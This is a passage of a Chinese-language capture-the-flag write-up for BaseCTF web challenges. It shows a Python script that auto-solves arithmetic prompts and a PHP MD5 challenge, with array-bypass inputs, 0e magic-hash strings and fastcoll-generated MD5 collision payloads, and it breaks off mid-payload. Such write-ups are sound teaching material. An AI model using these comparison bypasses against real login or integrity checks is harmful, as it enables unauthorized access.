keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> ast<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">:</span>    node <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>expression<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'eval'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:27436/"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span><span class="token punctuation">,</span>    <span class="token string">"user-agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">"lxml"</span><span class="token punctuation">)</span>    key_text <span class="token operator">=</span> soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\d+[+\-√ó√∑]\d+'</span><span class="token punctuation">,</span> key_text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        calculation <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>calculation<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'√∑'</span> <span class="token keyword">in</span> calculation<span class="token punctuation">:</span>            calculation <span class="token operator">=</span> calculation<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'√∑'</span><span class="token punctuation">,</span> <span class="token string">'//'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'√ó'</span> <span class="token keyword">in</span> calculation<span class="token punctuation">:</span>            calculation <span class="token operator">=</span> calculation<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'√ó'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> safe_eval<span class="token punctuation">(</span>calculation<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>calculation<span class="token punctuation">&#125;</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'CTF'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'BaseCTF(.*)'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><h4 id="ÊâÄ‰ª•‰Ω†ËØ¥‰Ω†ÊáÇ-MD5-ÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÊîªÂáª"><a href="#ÊâÄ‰ª•‰Ω†ËØ¥‰Ω†ÊáÇ-MD5-ÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÊîªÂáª" class="headerlink" title="ÊâÄ‰ª•‰Ω†ËØ¥‰Ω†ÊáÇ MD5?  (ÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÊîªÂáª)"></a>ÊâÄ‰ª•‰Ω†ËØ¥‰Ω†ÊáÇ MD5?  (ÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÊîªÂáª)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ÊâÄ‰ª•‰Ω†ËØ¥‰Ω†ÊáÇ MD5 ‰∫Ü?</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'apple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'banana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Âä†Âº∫ÈöæÂ∫¶Â∞±‰∏ç‰ºö‰∫Ü?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ‰ªÄ‰πà? ‰Ω†ÁªïËøáÂéª‰∫Ü?</span><span class="token comment">// Âä†Â§ßÂâÇÈáè!</span><span class="token comment">// ÊàëË¶ÅËÆ©‰ªñÊàê‰∏∫ string</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'appple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bananana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ÈöæÂêó?‰∏çÈöæ!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ‰Ω†ËøòÊòØÁªïËøáÂéª‰∫Ü?</span><span class="token comment">// Âì¶Âì¶Âì¶, ÊàëÂ∞ë‰∫Ü‰∏Ä‰∏™Á≠â‰∫éÂè∑</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'apppple'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$banana</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'banananana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$apple</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$banana</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ÂòªÂòª, ‰∏ç‰ºö‰∫Ü? Ê≤°ÁúãÁõ¥Êí≠ÂõûÊîæ?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ‰Ω†‰ª•‰∏∫ËøôÂ∞±ÁªìÊùü‰∫Ü</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ‰Ω†ÊÉ≥ÁúãÂà∞ random ÁöÑÂÄºÂêó?</span><span class="token comment">// ‰Ω†‰∏çÊòØÂæàÊáÇ MD5 Âêó? ÈÇ£ÊàëÂ∞±ÂëäËØâ‰Ω†‰ªñÁöÑ MD5 Âêß</span><span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'random'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$random</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />'</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span><span class="token comment">// check if name ends with 'admin'</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'‰∏çÊòØÁÆ°ÁêÜÂëò‰πüÊù•ÂáëÁÉ≠Èóπ?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$md5</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$random</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token variable">$md5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'‰º™ÈÄ†? NO NO NO!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ËÆ§Ëæì‰∫Ü, ÁúãÊ†∑Â≠ê‰Ω†ÁúüÁöÑÂæàÊáÇ MD5</span><span class="token comment">// ÈÇ£ flag Â∞±Áªô‰Ω†Âêß</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"ÁúãÊ†∑Â≠ê‰Ω†ÁúüÁöÑÂæàÊáÇ MD5"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Âä†Âº∫ÈöæÂ∫¶Â∞±‰∏ç‰ºö‰∫Ü<span class="token operator">?</span></span></code></pre><p>Á¨¨‰∏ÄÂ±ÇÂèØÁî®Êï∞ÁªÑÁªïËøá</p><pre class="language-php" data-language="php"><code class="language-php">apple<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>banana<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></code></pre><p>Á¨¨‰∫åÂ±ÇËΩ¨Âåñ‰∏∫‰∫Ü<code>string</code>ÔºåÊ≠§Êó∂Êï∞ÁªÑ‰ºöÂèòÊàê<code>array</code>Êó†Ê≥ïÁªïËøáÔºåÂèØ‰ª•Âà©Áî®ÂêéÈù¢ÁöÑÂº±ÊØîËæÉÔºåËÆ©0eÂºÄÂ§¥ÁöÑÂ≠óÁ¨¶‰∏≤ËØØ‰ª•‰∏∫ÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÔºåËΩ¨Âåñ‰∏∫0</p><pre class="language-php" data-language="php"><code class="language-php">appple<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>banananana<span class="token operator">=</span><span class="token constant">QLTHNDT</span> </code></pre><p>Á¨¨‰∏âÂ±ÇÂèòÊàê‰∫ÜÂº∫ÊØîËæÉÔºåÂèØ‰ª•‰ΩøÁî®fastcollÂ∑•ÂÖ∑Êù•ÂæóÂà∞‰∏Ä‰∫õMD5ÁúüÂÆûÁõ∏Á≠âÁöÑÂÄº</p><p>ÂÖàÈöè‰æøÂàõÂª∫‰∏Ä‰∏™txtÊñá‰ª∂ÔºåÁÑ∂ÂêéÂ∞ÜÊñá‰ª∂ÊãñÂÖ•<code>fastcoll</code>‰∏≠ÂæóÂà∞‰∏§‰∏™MD5ÂÄºÁõ∏Á≠âÁöÑÊñá‰ª∂ÔºåÁÑ∂Âêé‰ΩøÁî®phpÂæóÂá∫MD5ÂÄºÁõ∏Á≠âÁöÑ‰ø©Â≠óÁ¨¶‰∏≤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">function</span> <span class="token function-definition function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"D:\CTF\Tool\\fastcoll_v1.0.0.5.exe\drafr_msg1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"D:\CTF\Tool\\fastcoll_v1.0.0.5.exe\drafr_msg2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">apppple<span class="token operator">=</span>hsad<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">C5</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token number">23</span>Vg<span class="token operator">%</span><span class="token number">22</span>u<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">95</span>Z<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">8</span>DS<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token constant">F2</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span>EDf<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">-</span>ha<span class="token operator">%</span><span class="token number">88</span><span class="token operator">%</span><span class="token constant">D3</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">95</span>E<span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">21</span>y<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token number">12</span>f<span class="token operator">%</span><span class="token constant">B5H</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span>F7Lci<span class="token operator">%</span><span class="token number">8</span>Dg<span class="token operator">%</span><span class="token constant">FC</span><span class="token operator">%</span><span class="token number">7</span>B8y<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">8</span>E<span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">5</span>EI<span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span>C8n<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">9</span>FK_a<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>C1h<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">0</span>Atg<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">95</span>g<span class="token operator">%</span><span class="token constant">F9T</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">03</span>K<span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token constant">C8</span><span class="token operator">%</span><span class="token constant">A8W</span><span class="token operator">%</span><span class="token number">1</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span><span class="token number">9</span>F<span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token constant">BCT</span><span class="token operator">&amp;</span>banananana<span class="token operator">=</span>hsad<span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span 